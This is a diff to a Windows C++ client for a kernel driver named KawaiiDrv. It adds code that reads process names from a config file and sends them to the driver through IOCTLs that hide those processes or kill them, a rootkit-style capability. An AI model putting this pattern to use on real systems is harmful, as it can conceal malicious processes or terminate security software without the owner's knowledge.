@@ -2,10 +2,15 @@
 #include <fltUser.h>
 #include <stdio.h>
 #include <string>
-
+#include <iostream>
+#include <fstream>
 
 #pragma comment(lib, "fltlib")
 
+WCHAR Hprocs[50][100];
+int nhprocs = 0;
+WCHAR Kprocs[50][100];
+int nkprocs = 0;
 
 void DisplayTime(const LARGE_INTEGER& time) {
 	SYSTEMTIME st;
@@ -162,7 +167,55 @@ void HandleMessage(const BYTE* buffer) {
 	}
 }
 
+void readConfig() {
+	std::wstring line;
+	std::wifstream myfile;
+	BOOLEAN shprocs = FALSE;
+	BOOLEAN skprocs = FALSE;
+	myfile.open("Kawaii.conf");
+	if (myfile.is_open())
+	{
+		while (getline(myfile, line))
+		{
+			if (wcsstr(line.c_str(), L"[HProc]")){
+				shprocs = TRUE;
+				skprocs = FALSE;
+			}
+			else if (wcsstr(line.c_str(), L"[KProc]")) {
+				shprocs = FALSE;
+				skprocs = TRUE;
+			}
+			else if (shprocs && nhprocs < 50 ) {
+				::wcsncpy_s(Hprocs[nhprocs], line.c_str(), 100);
+				nhprocs++;
+			}else if (skprocs && nkprocs < 50) {
+				::wcsncpy_s(Kprocs[nkprocs], line.c_str(), 100);
+				nkprocs++;
+			}	
+		}
+	}
+	myfile.close();
+	auto hfile = ::CreateFile(L"\\\\.\\KawaiiDrv", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+	DWORD bytes;
+
+	if (hfile == INVALID_HANDLE_VALUE) {
+		printf("Could not get the driver Handle\n");
+		DWORD bytes = GetLastError();
+		printf("Got Error: %d\n", bytes);
+		return;
+	}
+	for (int i = 0; i < nhprocs; i++) {
+		::DeviceIoControl(hfile, IOCTL_HIDE_IMAGE, Hprocs[i], lstrlenW(Hprocs[i])*sizeof(WCHAR), nullptr, 0, &bytes, nullptr);
+	}
+	for (int i = 0; i < nkprocs; i++) {
+		::DeviceIoControl(hfile, IOCTL_KILL_IMAGE, Kprocs[i], lstrlenW(Kprocs[i]) * sizeof(WCHAR), nullptr, 0, &bytes, nullptr);
+	}
+}
+
 int wmain(int argc, const wchar_t* argv[]) {
+
+	readConfig();
+	/*
 	if (argc < 2) {
 		HANDLE hPort;
 		auto hr = ::FilterConnectCommunicationPort(L"\\FileBackupPort", 0, nullptr, 0, nullptr, &hPort);
@@ -195,7 +248,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 			printf("Got Error: %d\n",bytes);
 			return 1;
 		}
-
+		::DeviceIoControl(hfile, IOCTL_TOGGLE_FBP, nullptr, 0, nullptr, 0, &bytes, nullptr);
 		if (!::_wcsicmp(argv[1], L"-t")) {
 			::DeviceIoControl(hfile, IOCTL_TOGGLE_FBP, nullptr, 0, nullptr, 0, &bytes, nullptr);
 		} else{
@@ -205,5 +258,6 @@ int wmain(int argc, const wchar_t* argv[]) {
 			::DeviceIoControl(hfile, IOCTL_PROCESS_ADDPID, &pid, sizeof(ULONG), nullptr, 0, &bytes, nullptr);
 		}
 	}
+	*/
 	return 0;
 }
